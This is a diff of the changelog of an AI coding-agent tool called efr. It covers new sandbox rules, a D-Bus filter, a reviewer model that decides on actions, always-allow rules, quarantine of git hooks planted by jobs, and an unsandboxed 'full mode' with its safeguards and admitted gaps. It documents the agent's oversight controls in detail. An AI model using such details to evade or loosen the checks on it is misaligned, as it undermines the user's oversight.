-  and efr tells the model which call the filter refused and how to ask for the whole
-  bus for one command. The record of a command or a job keeps the refused calls. When
-  the filter stops during a command, efr tells the model too.
-- `[dbus] proxy` and `[[dbus.allow]]`: turn the bus filter on or off, or allow more
-  bus methods. For systemd, logind and the other default services efr accepts only read
-  methods; for other services it refuses wildcards and known write and power methods.
-  efrd refuses an entry of a bad shape at start and at a reload, and
-  `efr config check` shows the same errors.
-- Answer `a` (always), then `y`, at an exit question to save a rule in
-  `[[sandbox.allow]]` of `config.toml`. A later command that the rule covers runs with
-  no question and no review. Rules cover one host and port, one write dir, or one
-  socket. efr keeps the comments of the file, and a file with no `[sandbox]` table gets
-  no empty `[sandbox]` line above the rule. A rule of a bad shape stops efrd at start
-  and makes a reload fail, and the error names that rule and its line, such as
-  `sandbox.allow[2]` at line 12; a rule that no longer passes the floor checks is disabled
-  with a warning, and efrd still starts. The question shows the rule next to its keys,
-  such as `a always: write under ~/notes`, and `a` first asks
-  `save rule "write under ~/notes"? y/n`: any key but `y` goes back to the question.
-  Then one line says `saved as sandbox.allow[2]: write under ~/notes`, or why efr did
-  not save it. A command that a rule covers shows `allowed by your rule
-  sandbox.allow[2]: write under ~/notes`, also in `efr history`.
-- `efr sandbox allow` lists the always rules of `config.toml` with their numbers, and
-  marks a rule that efrd disabled with the reason. `efr sandbox allow remove N` asks
-  `remove sandbox.allow[N]: <rule>? y/n`, removes the rule with `y`, keeps the comments
-  of the file, and makes efrd read the file again. It removes nothing when the rule at
-  N changed after the question.
-- `efr status` and `efr sandbox check` show `bus filter on`, or `bus filter off` with
-  the reason, such as `dbus.proxy = false` or `xdg-dbus-proxy is not installed`. While
-  efrd checks the filter again after a reload, they keep the state of the last check,
-  and show `off` only when the new check fails. With
-  `[dbus] proxy = true`, a command shows each bus call that the filter refused under
-  its result, such as `bus: refused system org.freedesktop.systemd1 Manager.StartUnit`.
-- The Arch packages name `xdg-dbus-proxy` as an optional dependency, for the bus
-  filter.
+  `efr jobs` shows when a moved command waits for input that nobody can type. In tmux,
+  press Ctrl+B twice. A command that waits for input, that can ask at the terminal
+  (such as `sudo`), or that efr does not allow as a job cannot move, and neither can a
+  call that holds the sandbox's cache. `docs/use/jobs.md`, "Move a running command to
+  the background", has the details.
+- In `auto`, a loopback port that a contained background job listens on is reachable
+  on the same port of `127.0.0.1` on your machine, so your browser opens a dev server
+  that the model started. The view shows
+  `job j1 listens on 127.0.0.1:8765 -> http://localhost:8765`, and `efr jobs` lists the
+  ports. efr forwards TCP ports from 1024 up. It never forwards a port that is in use
+  on your machine, port 3128 of a proxy job, or a well-known service port, such as
+  5432, 6379 or 1455 of `efr login`. Only your own user's programs can connect. The
+  forward ends with the job. A foreground call and a moved call get no forward.
+  `jobs.forward_ports = false` turns it off.
+- The model learns whether efr forwards each port of its jobs. Before its next step,
+  also in the same turn, it reads a note from efr: the URL of a forwarded port, or the
+  reason why efr does not forward a port, with the advice to choose another port. So
+  the model does not give you a URL that opens another server. The `jobs` tool shows
+  the outcome of each port.
+- In `auto`, a contained command reaches the forwarded ports of its conversation's
+  jobs at `127.0.0.1` and `localhost` with no question, so the agent can check the dev
+  server that it started. A line that names a port of a job that efr does not forward,
+  such as a port that a program of yours uses, does not run: the whole network would
+  reach your program, not the job. efr asks you nothing and tells the agent why, such
+  as `efr: port 8767 of job j1 is not forwarded: 127.0.0.1:8767 is in use on this
+  machine. ...`. When the job started less than 3 seconds ago, efr first waits for the
+  outcome of the port. A port of no job still asks. `docs/use/jobs.md`, "Open a dev
+  server in your browser", has the rules.
+- While a job runs in the sandbox, efr checks the git settings and hooks of its
+  projects every 5 minutes and before each sandboxed command there. This includes the
+  submodules at any depth, the git dir that a `.git` file names, and the include files
+  and the `core.hooksPath` dir that their config names. When the job planted a hook or
+  a git setting that runs code, efr moves it to the quarantine and stops the job. After
+  a restart, efr checks a job that the last efrd left running. Before a git or upload
+  line runs outside the sandbox, efr checks every running job in the sandbox.
+- To give a job your shell's environment, the hidden shell writes its exported
+  variables to an `env` file (0600) in efr's runtime dir at each prompt where they
+  changed. It also writes its functions, aliases and options for the sandbox at such a
+  prompt, not only before a command in `auto`. A job outside the sandbox, and any
+  command outside the sandbox, keeps the variables that place efr's own dirs
+  (`EFR_HOME`, `EFR_RUNTIME_DIR` and the others), so an `efr` in it reaches the efrd
+  that runs it.
+- Full mode, a fourth permission mode: commands run as you, with no sandbox and no
+  questions. Turn it on by hand with `permissions.allow_full = true` in `config.toml`
+  (or `efr config set`). Then choose it with `,mode full` in a terminal,
+  `efr send --mode full` for one prompt, or `permissions.mode = "full"` as the
+  default. efr still reads each command line. It denies secrets, its own config and
+  its own dirs. It asks before `sudo`, before a process that outlives the turn, before
+  a delete of `~`, `/`, a system dir or a project, before a delete that undo cannot
+  revert, and before a line that reads or writes a whole dir with a secret or efr's
+  config below it (`du ~`). Only your own machine answers the `sudo` and delete
+  questions, and a delete question waits 2 minutes. efr takes its snapshot before each
+  call and copies a file outside the project first when the line names it, so
+  `efr undo` reverts the project and the files that efr saw. efr does not read a
+  script or a program that a line starts: it can do what you can, also answer efr's
+  questions. Full mode gives no protection against prompt injection or a mistake in a
+  script. `docs/use/modes.md`, "full", and `docs/permissions.md`, "Full mode", have
+  the details.
+- Full mode never runs in a turn from a phone, in a turn that a job notice starts, in
+  an efrd that runs as root or has `undo.enabled` or `snapshot.enabled` set to false,
+  or with a hidden shell that is no zsh. A steer from a phone never goes into a running
+  full turn. When efrd cannot run full mode, a turn that names no mode runs as `auto`
+  and records why, and a prompt that names full mode fails with the reason. When you
+  turn full mode off while a full turn runs, its next call does not run and the turn
+  stops. efrd also stops each background job that a full call started
+  (`stopped: full mode was turned off`), with no job notice turn.
 - `,mode full` and `efr settings --mode full` ask efrd first. When `config.toml` does
   not allow full mode, or efrd cannot run it, they fail with the reason, and the
-  terminal keeps its old mode. Else three lines say what full mode does, what efr still
-  reads and asks, and that a script or a program that a line starts is not read.
-- `efr status` shows `full mode allowed`, `full mode off (permissions.allow_full is
-  false)` or `full mode refused (<reason>)`, and `default mode full` when
-  `config.toml` makes full mode the default. When efrd holds a change of
-  `config.toml` that loosens permissions, `efr status` shows `config held` with the
-  keys that loosen, and `efr config reload` says `config.toml is held; the old
-  settings stay` with the reason.
-- A full turn shows `full mode` in red at its start and `full` in red in the status
+  terminal keeps its old mode. If not, three lines say what full mode does, what efr
+  still reads and asks, and that a script or a program that a line starts is not
+  read. The zsh plugin ignores `EFR_MODE=full` from the environment when it loads, and
+  says so on one line: use `,mode full`. Any other `EFR_MODE` still gives the
+  terminal's first mode.
+- The settings tool refuses to change `permissions.allow_full` and refuses to set
+  `permissions.mode = "full"`. `permissions.mode = "full"` in `config.toml` needs
+  `permissions.allow_full = true`. Without it, efrd does not load the file, and the
+  error says to set the key or another `permissions.mode`. When `config.toml` makes
+  full mode the default, efrd writes a warning to its log at the start and at the
+  reload that makes it so.
+- A full turn shows `full mode` in red at its start, and `full` in red in the status
   row and on the row of a running call. At its end, one line lists what efr saw full
   mode let through, such as `efr saw 2 actions that full mode let through: write
-  ~/notes.txt, upload (git push)`; a script's actions are not in it. A question that
-  full mode still asks shows why on its first row, and `expires in 2 min` when it waits
-  a fixed time. `efr history --verbose` shows `exit allowed by full mode`, and `efr
-  undo --list` shows `full` for a full turn. A turn that asked for full mode and runs
-  with less says `this turn runs as auto: <reason>`.
-- While a terminal's prompts run in full mode, the zsh plugin shows a mark next to
-  the robot in sticky mode, also when `config.toml` makes full mode the default (see
-  Changed).
-- The changed files of a turn now fall into groups: generated (lock files, `*.snap`
-  snapshots, `fixtures/`), tests, docs and code. The line at the end of a turn names
-  up to two groups that are not code, the largest first, such as `9 files changed, +635
-  -44 (evals +503, tests +77)`. A turn that changed only code shows the line as before.
-  `efr diff --stat` starts with a table of every group and a total row, and
-  `efr diff --stat --all` adds up every turn of the conversation that undo did not
-  take back. Your own groups go in `config.toml`, such as `[diff.groups] evals =
-  ["evals/", "*.eval.toml"]`; they match first, in the order of the file. A group
-  named `code` keeps its files in code, and `total` is not a name of a group.
-- `efr history` shows the line of the changed files, such as `3 files changed, +24 -7`,
-  for each turn that `efr undo` cannot take back.
-- `efr context` and `,context` show what fills the model's context of this terminal's
-  conversation: the model's last count with its `ctx N%`, then efr's estimate of the
-  next request by part (the system prompt, the tools, the summary, the prompts and
-  their preambles, the notices, the answers, the tool calls and the tool outputs), the
-  five largest items, such as `output of $ cargo test, turn 12`, the compactions and
-  the cache use of the conversation, such as `last turn 91%; conversation 83% read,
-  210k written (200k for 1h)`. It shows no text of a message. `efr context <id>`
-  shows another conversation, `--model` counts for another model, and `--json` gives
-  the same facts to scripts. `,context <words>` was a prompt; it now runs this
-  command with the words.
+  ~/notes.txt, upload (git push)`; the actions of a script are not in it. A question
+  that full mode still asks shows why on its first row, and `expires in 2 min` when it
+  waits a fixed time. `efr history --verbose` shows `exit allowed by full mode`, and
+  `efr undo --list` shows `full` for a full turn. A turn that asked for full mode and
+  runs with less says `this turn runs as auto: <reason>`.
+- While a terminal's prompts run in full mode, the zsh plugin shows the mark 🔓 next
+  to the robot in sticky mode, such as `🤖🔓 app › `, also when `config.toml` makes
+  full mode the default. `EFR_FULL_MARK` sets another mark, and an empty value shows
+  none. `efr_prompt_info` shows the mark too. Outside sticky mode, the red first line
+  of each turn says full mode.
+- `efr status` shows `full mode` as `allowed`, `off (permissions.allow_full is
+  false)` or `refused (<reason>)`, and `default mode full` when `config.toml` makes
+  full mode the default.
+- A full call clears sudo's cached password before and after the call. When your
+  sudoers shares the cache across terminals (`timestamp_type=global`), this also
+  clears your own terminal's cache. A background job of full mode cannot gain rights
+  through `sudo` or another setuid program (`no_new_privs`), so it cannot use sudo's
+  cached password. A polkit rule with no authentication still works there.
+- While a full turn or its job runs, efr does not load a change of `config.toml` that
+  loosens permissions. It keeps the change held after that, also over a restart of
+  efrd: `efr status` shows `config held` with the keys that loosen, your terminal
+  hears it once, and `efr config reload` says `config.toml is held; the old settings
+  stay` with the reason. If you did not make the change, take it out of the file, and
+  then run `efr config reload`. A change that turns full mode off, such as
+  `permissions.allow_full = false`, applies at once, also while another change is
+  held.
+- `,resume` and `efr resume` list the recent conversations, the ones of the current
+  project first, with their title, project, age and turn count. `,resume N` (or an id
+  start) makes one this terminal's conversation again: the next prompt in its project
+  continues it, its hidden shell starts in its last directory, and its jobs report
+  here. When another open terminal holds it, efr names that terminal and asks first;
+  `efr resume --take N` moves it with no question. `,resume <words>` searches when the
+  words are not a number or a conversation id. `efr history` shows
+  `resumed in /dev/pts/7` where it happened.
+- `,resume` opens a live search picker when fzf 0.46 or newer is installed (an
+  optional program, as bubblewrap is). It shows below the command line, never full
+  screen, and clears itself when it closes. Type to search the titles and the text of
+  your conversations; the preview shows the matching lines. Enter continues the
+  conversation here, Ctrl+O prints it like `efr history`, and Esc closes it.
+  `,resume <words>` opens the picker with the words as its query, and the words never
+  show in the process list. Without fzf, `,resume` shows a numbered list, and
+  `,resume <words>` prints the best matches. `[resume] picker = "list"` turns the
+  picker off.
+- efrd now keeps a search index of your conversations: the titles, your prompts, the
+  model's answers and the commands that the agent ran. It never holds the output of a
+  command, the contents of a file or the text of a heredoc. Before text goes into the
+  index, efr removes the secrets that it recognises: keys with a known start, long
+  random words, tokens, passwords in URLs and in assignments, private keys, and
+  `name: value` secrets in config text. It cannot recognise every secret. After the
+  upgrade, efrd indexes your old conversations in the background. Until it ends, a
+  search shows how far it is. `efr search <words>` prints the conversations that
+  match, best first, with the matching text. `docs/use/conversations.md` has the
+  details.
+- efr has a docs website at <https://eggfriedrice24.github.io/eggfriedrice.code/>.
+  mdBook builds it from the files in `docs/`: a guide to install and use efr, the
+  settings and the `config.toml` reference, help, the internals and this changelog.
+  The decision records stay on GitHub only for now. The site is dark, in the colours
+  of the eggfriedrice design system, and it works on a phone.
 - A new terminal in a registered project picks up the project's newest conversation
   when no open terminal holds it and it was active within
   `conversation.tty_idle_hours`. Its hidden shell starts in its last directory, as
@@ -417,202 +368,264 @@ into the GitHub release notes, and it stops when the section is missing.
   `↪ picked up "fix the proxy test" in app (25 min ago); ,new starts fresh`. A
   conversation is never open in two terminals: a terminal whose shell still runs, or
   that follows the conversation, holds it. A phone never holds one. A conversation
-  that no terminal held, such as one of `efr send` from a script or one that the phone
-  started, is never picked up. `efr history` shows `picked up in /dev/pts/7` where it
-  happened.
-- `efr history --verbose` shows the tokens of each turn on one muted line, such as
-  `18.2k in, 1.1k out, cache 91%, wrote 1.2k (1h)`: the input, the output, the cache
-  share and the cache writes, also for an interrupted or failed turn. It also shows
-  `asked again for a real reason` when the reviewer asked its model again.
-- With `log = "info,efr_conversation::usage=debug"`, the log of efrd shows one line
-  with the numbers of each model call, such as `usage gap_ms=95000 input=18200
-  output=1100 read=16600 write=1200 write_1h=1200`, so you can measure which
-  `[anthropic] cache_ttl` costs less. The line holds no text of a prompt or an answer.
-- `,resume` and `efr resume` list the recent conversations, the ones of the current
-  project first, with their title, project, age and turn count. `,resume N` (or an
-  id start) makes one this terminal's conversation again: the next prompt in its
-  project continues it, its hidden shell starts in its last directory, and its jobs
-  report here. When another open terminal holds it, efr names that terminal and asks
-  first; `efr resume --take N` moves it with no question. `efr history` shows
-  `resumed in /dev/pts/7` where it happened.
-- A marker shows the scope of a prompt before you send it: in sticky mode the line
-  shows `🤖 app › ` in a registered project and `🤖 ○ › ` outside projects, the status
-  row of a running turn ends with the scope, and `efr_prompt_info` (or the variable
-  `$efr_scope`) gives it to your own prompt. efr never changes your prompt. The zsh
-  plugin runs no program for it: efrd writes the registered projects to
-  `projects.tsv` in its runtime directory.
+  that no terminal held, such as one of `efr send` from a script or one that a phone
+  started, is never picked up.
+  `efr history` shows `picked up in /dev/pts/7` where it happened.
+- A marker shows the scope of a prompt before you send it. In sticky mode, the line
+  shows `🤖 app › ` in a registered project and `🤖 ○ › ` outside projects. The status
+  row of a running turn ends with the scope. `efr_prompt_info` (or the variable
+  `$efr_scope`) gives the scope to your own prompt, with each `%` doubled for
+  `prompt_subst`. efr never changes your prompt. The zsh plugin runs no program for
+  it: efrd writes the registered projects to `projects.tsv` in its runtime directory.
 - A prompt in a git repository that is not a registered project shows, at most once a
   day for each repository, that writes there ask you and how to register it:
   `○ ~/p/tool is a git repo but not a project: writes there ask you. efr project add
   ~/p/tool registers it.` efr never registers a repository by itself.
   `conversation.repo_hint = false` turns it off.
-- When a command of the agent still runs in its hidden shell after its call answered the
-  model, efr now tells you: the call shows `still runs in the hidden shell`, the end of the
-  turn names the command, and the next prompt shows a notice. When it waits for input,
-  such as a password, you see the line that asks, and you answer it in the turn view or
-  after `,shell` (or `efr shell`); Ctrl+C there stops it. A wait for a password stays
-  for you only when you or your own rule approved a line that may ask for one; efr
-  stops other such waits and tells you. Such a command that waits for input ends after
-  `shell.interactive_timeout_minutes`. Any command that waits for input past its timeout
-  goes on while you follow the turn. `docs/use/hidden-shell.md`, "A busy hidden
-  shell", has the details.
+- `efr away` and `,away` tell efr that you are away from the conversation of this
+  terminal. efr also counts you away after 10 minutes without input in the
+  conversation (`presence.away_after_minutes`). While you are away, the status row of
+  a running turn shows `away`, and a question waits 5 minutes
+  (`presence.away_wait_secs`), also a question that already waited when you left.
+  Then the call does not run, and the model goes on without it and names it in its
+  answer. Your next input ends the away state.
+- `efr context` and `,context` show what fills the model's context of this terminal's
+  conversation: the model's last count with its `ctx N%`, then efr's estimate of the
+  next request by part (the system prompt, the tools, the summary, the prompts, the
+  notices, the answers, the tool calls and the tool outputs), the five largest items,
+  such as `output of $ cargo test, turn 12`, the compactions and the cache use, such
+  as `last turn 91%; conversation 83% read, 210k written (200k for 1h)`. It shows no
+  text of a message. `efr context <id>` shows another conversation, `--model` counts
+  for another model, and `--json` gives the same facts to scripts. `,context <words>`
+  was a prompt before; it now runs this command with the words.
+- A prompt now tells the model the recent commands of your terminal, after the last
+  command: each one with its exit status, its directory when that is not the current
+  one, and how long ago it ended. The zsh plugin keeps the last 10 command lines of
+  each terminal, but never a `,` line, an `efr` command or a line that starts with a
+  space. A line that starts with a space is not sent as the last command either. The
+  new key `context.recent_commands` sets how many the model sees (8 by default, 0 for
+  none). Like the last command, they go to the model with their secrets redacted, and
+  never into the event log. The plugin keeps the first 2,000 characters of each line
+  and at most 64 KiB of recent commands, so a very long line never stops a `,` line.
+- When a command of the agent still runs in its hidden shell after its call answered
+  the model, efr now tells you: the call shows `still runs in the hidden shell`, the
+  end of the turn names the command, and the next prompt shows a notice. When the
+  command waits for input, such as a password, you see the line that asks. You answer
+  it in the turn view, or with the new `,shell` (or `efr shell`), where Ctrl+C stops
+  it. A wait for a password stays for you only when you or your own rule approved a
+  line that may ask for one; efr stops other such waits and tells you. Such a command
+  that waits for input ends after `shell.interactive_timeout_minutes`. Any command
+  that waits for input past its timeout goes on while you follow the turn.
+  `docs/use/hidden-shell.md`, "A busy hidden shell", has the details.
 - A paste of several lines that all start with `,` now sends one prompt for each line.
   The first prompt runs, and the others wait behind it in their order, as Tab in the
   input row queues them. A paste with any other line stays one prompt.
-- efr has a docs website. mdBook builds it from the files in `docs/`: a guide to install
-  and use efr, the settings and the `config.toml` reference, help, the internals and
-  this changelog. The decision records stay on GitHub only for now. It is dark, in the colours of the eggfriedrice
-  design system, and it works on a phone. `mdbook build book` writes it to `target/book`.
+- In `auto`, efr can change a file that runs code later, such as `~/.zshrc` or a
+  Hyprland config, when you name it, such as "add an alias to my zshrc" or "change the
+  gap in my hyprland config". The reviewer decides, and it sees the change that efr
+  will write. A whole directory still asks you. efr copies the file first, and at the
+  end of the turn each such file gets one line: `changed ~/.zshrc; efr undo reverts
+  it`, in the view and in `efr history`, also when the turn failed or you interrupted
+  it. The turn's line of changed files does not count it again. With
+  `snapshot.enabled = false`, such an edit asks you, because efr cannot copy the file
+  first. `efr sandbox explain` says that `efr undo` reverts such an edit.
+- In `auto`, the reviewer can also allow a change that you name to a unit
+  (`systemctl --user enable`, `mask`), a link into a `*.wants` directory, the
+  autostart directory, your crontab and linger, when it can read what the change
+  installs. The reviewer also reads each unit that the unit's `Also=` names. efr
+  copies the links, the crontab or the linger setting first, so `efr undo` brings them
+  back. A unit file or a link to it that changed in the turn asks you.
+  `systemctl --user link`, `edit`, `revert`, `at` and `systemd-run --user` still ask
+  you. efr runs `crontab` and `loginctl` itself only when root owns them and their
+  directory; if not, these forms ask you. `loginctl enable-linger` with your own user
+  name or uid counts as the form with no user. `crontab -l` only reads your crontab,
+  so the reviewer can let the model read it before it writes all of it with
+  `crontab -`.
+- Answer `a` (always), then `y`, at a question for an action that leaves the sandbox
+  to save a rule in `[[sandbox.allow]]` of `config.toml`. A later command that the
+  rule covers runs with no question and no review. A rule covers one host and port,
+  one write dir, or one socket. The question shows the rule next to its keys, such as
+  `a always: write under ~/notes`, and `a` first asks
+  `save rule "write under ~/notes"? y/n`: any key but `y` goes back to the question.
+  Then one line says `saved as sandbox.allow[2]: write under ~/notes`, or why efr did
+  not save it. A command that a rule covers shows
+  `allowed by your rule sandbox.allow[2]: write under ~/notes`, also in
+  `efr history`. efr keeps the comments of the file. A rule of a bad shape stops efrd
+  at start and makes a reload fail, and the error names that rule and its line, such
+  as `sandbox.allow[2]` at line 12. A rule that no longer passes the floor checks is
+  disabled with a warning, and efrd still starts.
+- An always rule never covers a privilege, persistence, upload, desktop, masked-read
+  or synced-folder exit. It never runs a command outside the sandbox, never names a
+  floor, efr's own dirs or a secret, never covers a dir above a floor, a write in a
+  floor or in a `.git` dir, or a path through a link, and never beats a `deny` or
+  `ask` rule or `network.deny`. Only an answer in your own terminal saves a rule; efr
+  never writes one for a phone or the model. Any program of yours that can write
+  `config.toml` can still add one. `docs/use/sandbox-basics.md`, "Always-allow
+  rules", has the details.
+- `efr sandbox allow` lists the always rules of `config.toml` with their numbers, and
+  marks a rule that efrd disabled with the reason. `efr sandbox allow remove N` asks
+  `remove sandbox.allow[N]: <rule>? y/n`, removes the rule with `y`, keeps the
+  comments of the file, and makes efrd read the file again. It removes nothing when
+  the rule at N changed after the question.
+- A bus filter for `auto`, on by default (`dbus.proxy = true`). Read-only system
+  queries now run with no review: `hostnamectl`, `timedatectl`, `localectl`,
+  `systemctl --failed`, `systemctl status <unit>` and the other read forms,
+  `systemctl --user --failed`, `loginctl list-sessions`, and desktop notifications
+  with `notify-send`. The command reaches the system or session bus only through a
+  filter that allows read methods and the calls of `notify-send`. A background job can
+  run such queries too; the whole bus stays refused for jobs. The filter needs
+  `xdg-dbus-proxy` 0.1.9 or newer. Older versions cannot serve `hostnamectl` and the
+  other systemd tools, and let some messages past the filter. Ubuntu 24.04 and Debian
+  ship an older version, so there the filter stays off until they ship 0.1.9. When the
+  filter is off, these queries go to the reviewer, and the session bus commands ask
+  you, with no warning unless you set `dbus.proxy = true` yourself.
+  `dbus.proxy = false` turns the filter off. `docs/sandbox.md`, "The bus filter", has
+  the details.
+- A bus call that the filter refuses fails in the command. efr tells the model which
+  call the filter refused and how to ask for the whole bus for one command. The
+  command shows each refused call under its result, such as
+  `bus: refused system org.freedesktop.systemd1 Manager.StartUnit`, and the record of
+  a command or a job keeps them. When the filter stops during a command, efr tells the
+  model too.
+- `[[dbus.allow]]` allows more bus methods. For systemd, logind and the other default
+  services, efr accepts only read methods. For other services, it refuses wildcards
+  and known write and power methods. efrd refuses an entry of a bad shape at start and
+  at a reload, and `efr config check` shows the same errors.
+- The bus filter of a command runs in its own Landlock domain with no TCP, a seccomp
+  filter and an fd limit. It reads only its program and libraries, connects only to
+  the two real buses, and makes its sockets only in the command's bus dir. Each
+  command gets its own filter, which ends with the command. A filter that cannot start
+  fails the command; the command never gets the whole bus instead. A bug in the filter
+  itself still reaches your bus rights.
+- In `auto`, `ss`, `ip addr`, `ip -s link`, `ip route`, `nstat` and reads of
+  `/proc/net` now run with no review and show your machine's real network: its
+  sockets, links, counters and routes. The command runs in your machine's network
+  namespace, but it cannot open a network socket: only local Unix sockets and the
+  netlink views of `ss` and `ip` work, `listen` fails, and Landlock refuses TCP and
+  connects to abstract Unix sockets outside the sandbox. Every program in such a call
+  gets the same limits. A line that also does other work, `iw`, `ifconfig`,
+  `netstat`, and changes such as `ip link set` still go to the reviewer. A background
+  job that watches your network now starts with no review too. The new key
+  `network.netview` (default `true`) turns this off. The dim line at the end of such a
+  turn says `host network view (no sending)`.
+- In `auto`, `df` and `findmnt` now run with no review and show your machine's mounts
+  with their real sizes, also for `/tmp`, `/dev/shm` and your runtime dir. efr reads
+  the mounts outside the sandbox. A mount that does not answer in one second shows
+  `-`, so `df` never hangs on it. `df <path>` shows where a write in the sandbox goes,
+  for example the private `/tmp`. Mounts below a hidden path, and mounts of other
+  users, show no sizes. Every sandboxed command could already list the mounts through
+  `/proc/<pid>/mountinfo`; the mount view adds their sizes. When efrd runs in a mount
+  namespace of its own, for example because a unit drop-in sets `ProtectHome`, `df`
+  and `findmnt` go to the reviewer and run outside the sandbox instead. A path or a
+  wrapper, such as `/bin/df`, `command df` or `timeout 10 df`, also goes to the
+  reviewer, because it runs the real `df`.
+- `efr status` and `efr sandbox check` show the network of a sandboxed command
+  (`network proxy`, `network none`, or `network none (proxy self-test failed)`),
+  whether the network view works (`netview yes`, `netview no` with the reason, or
+  `netview off (network.netview = false)`), and the bus filter (`bus filter on`, or
+  `bus filter off` with the reason, such as `dbus.proxy = false` or
+  `xdg-dbus-proxy is not installed`). While efrd checks the bus filter again after a
+  reload, they keep the state of the last check.
+- The dim line at the end of a turn names the network that its commands had:
+  `network through efr's proxy` in place of `no network` when a command of the turn,
+  or a background job that the turn started, ran with the proxy, and `full network`
+  when a command had the whole network. When the turn changed files in projects, the
+  line names them, such as
+  `sandbox: wrote in app and lib; could write $SCRATCH, private /tmp; ...`.
+- `sandbox.keep_downloads` (default `false`): in the `tmp` cache mode, the download
+  caches (`~/.cargo`, `~/go/pkg/mod`, `~/.npm`, the bun and pnpm stores) keep what a
+  command downloads for the rest of the conversation, in efr's private layer. Your own
+  caches do not change. It is off by default because each sandboxed command then takes
+  about 3 to 4 ms more to start.
+- The changed files of a turn now fall into groups: generated (lock files, `*.snap`
+  snapshots, `fixtures/`), tests, docs and code. The line at the end of a turn names
+  up to two groups that are not code, the largest first, such as
+  `9 files changed, +635 -44 (evals +503, tests +77)`. A turn that changed only code
+  shows the line as before. `efr diff --stat` starts with a table of every group and a
+  total row, and `efr diff --stat --all` adds up every turn of the conversation that
+  undo did not take back. Your own groups go in `config.toml`, such as
+  `[diff.groups] evals = ["evals/", "*.eval.toml"]`; they match first, in the order of
+  the file. A group named `code` keeps its files in code, and `total` is not a name of
+  a group.
+- `efr history` shows the lines of the reviewer, its pause, the expiry of a question
+  while you were away, the space that a cache delete freed and each changed file that
+  runs code later. `efr history --verbose` adds the model of each review, the step of
+  its chain, its time and the models that it skipped, such as
+  `skipped claude-haiku-5-5: parse error`, and `asked again for a real reason` when
+  efr asked the reviewer again.
+- `efr history --verbose` shows the tokens of each turn on one muted line, such as
+  `18.2k in, 1.1k out, cache 91%, wrote 1.2k (1h)`: the input, the output, the cache
+  share and the cache writes, also for an interrupted or failed turn.
+- A turn that ends with no answer says why, such as
+  `the model stopped with no answer (stop: refusal)`. An answer that reached the
+  output limit says so too.
+- The journal of efrd has a line for a failed or interrupted turn, and the request id
+  of a model call that failed. The `phase=model_answer` debug line says how the answer
+  ended: `stop_reason=` with the provider's reason, or `outcome=interrupted` or
+  `outcome=error`.
+- With `log = "info,efr_conversation::usage=debug"`, the log of efrd shows one line
+  with the numbers of each model call, such as `usage gap_ms=95000 input=18200
+  output=1100 read=16600 write=1200 write_1h=1200`, so you can measure which
+  `[anthropic] cache_ttl` costs less. The line holds no text of a prompt or an answer.
+- The Arch packages name `fzf` (for the search picker) and `xdg-dbus-proxy` (for the
+  bus filter) as optional dependencies.
 
 ### Changed
 
-- `,resume <words>` now searches when the words are not a number or a conversation id.
-  The picker opens with the words as its query; without fzf, the best matches print.
-  The words never show in the process list.
-- `, resume` (with a blank after the `,`) now runs `,resume`, and does not send the
-  prompt "resume". The same rule applies to `new`, `compact`, `context`, `away` and
-  `shell`, and to `mode`, `model` and `effort` with at most one value that efr accepts.
-  In sticky mode, a line of only one of these words runs that command too. A prompt
-  with any other word stays a prompt.
-- The command line now shows a pasted prompt of several lines as you pasted it, not as
-  a quoted line (`say\ one$'\n'...`). History keeps the whole text, and Enter on it
-  sends the same prompt again.
-- In the input row of a followed turn, Ctrl+B no longer moves the cursor back: it moves
-  the running shell call to the background. The Left arrow still moves the cursor back.
-- efr now knows that `rsync`, `scp`, `sshfs` and `git` over ssh may ask for a password,
-  also with a remote shell in `-e`, `RSYNC_RSH`, `GIT_SSH_COMMAND` or `core.sshCommand`.
-  Such a call outside the sandbox runs past the model's timeout while you follow the
-  turn, up to `shell.interactive_timeout_minutes`, also after the reviewer, a rule or
-  full mode allowed it. Its question says that you may need to type your password; a
-  question about a sandboxed command never says so.
-- A terminal keeps one conversation for each registered project that you worked in,
-  and one for everything outside registered projects. The conversation changes when
-  you send a prompt, not when you `cd`: a prompt in `~/p/app` (or below) continues the
-  terminal's `app` conversation, and `cd ~` and a prompt go back to its conversation
-  outside projects. A dim line before the reply names each change, such as
-  `↪ back to "fix the tests" in app (2 h ago)` or `↪ new conversation for app (from
-  ~)`, and the first line of each reply names the scope (`app`, or
-  `○ no project · ~`); the settings of a prompt follow on the same line after ` · `.
-  `conversation.tty_idle_hours` now applies to each of these conversations on its own.
-  `,new` starts a new conversation for the current scope only. `efr history`,
-  `efr undo`, `efr diff`, `efr jobs` and the other commands act on the conversation of
-  the terminal's last prompt. `conversation.follow_project = false` keeps one
-  conversation per terminal, as before. `efr send` typed by hand in a terminal names
-  its shell, so a new shell on the same terminal starts fresh. The first start of the
-  new efrd updates its database once.
-- The zsh plugin no longer shows the red `full ` tag before the typed text. In sticky
-  mode the mark 🔓 stands next to the robot while the terminal's prompts run in full
-  mode, such as `🤖🔓 app › `; outside sticky mode the red first line of each turn
-  says full mode. `EFR_FULL_MARK` sets another mark, and an empty value shows none.
-  `efr_prompt_info` shows the mark too.
-- A phone that answers a question that only your own machine answers gets the text
-  `only the user's own machine answers a privilege exit, a delete that full mode guards,
-  or a background job`.
-- The settings tool refuses to change `permissions.allow_full`, the new key that
-  allows full mode, and refuses to set `permissions.mode = "full"`. You set them by
-  hand or with `efr config set`. `permissions.mode = "full"` in `config.toml` needs
-  `permissions.allow_full = true`; without it, efrd does not load the file, and the
-  error says to set the key or another `permissions.mode`.
-- When `config.toml` makes full mode the default, efrd writes a warning to its log at
-  the start and at the reload that makes it so. When efrd cannot run full mode (it
-  runs as root, `undo.enabled` or `snapshot.enabled` is false, or the hidden shell is
-  no zsh), a turn that names no mode runs as `auto` and records why. A prompt that
-  names full mode then fails with the reason.
-- The zsh plugin ignores `EFR_MODE=full` from the environment when it loads, and says
-  so on one line: use `,mode full`. Any other `EFR_MODE` still gives the terminal's
-  first mode.
-- `network.mode` is now `"proxy"` by default. Package fetches such as `cargo build`
-  with a new dependency, `npm install` and `pip install` run with no review. Set
-  `network.mode = "none"` to get the old behavior: no network, and a review that opens
-  the whole network for one command.
-- In `auto`, `write_file` and `edit` outside the project and `$SCRATCH` are an exit
-  that the reviewer decides, as a shell write there is.
-- In `auto`, a write that runs outside the sandbox, such as `mv src ~/x`, and an
-  `outside` call go to the reviewer. An `outside` call whose program changed in this
-  turn still asks you, and so does one that runs an interpreter on code that efr
-  cannot read, such as `python3 -c`, `sh -c` or a script.
-- In `auto`, an allow of the reviewer for a network call needs a message of yours that
-  names each host that the line shows: the host of a URL, of a remote operand of
-  `scp`, `sftp` or `rsync`, or the destination of `ssh`. So "upload my notes" does
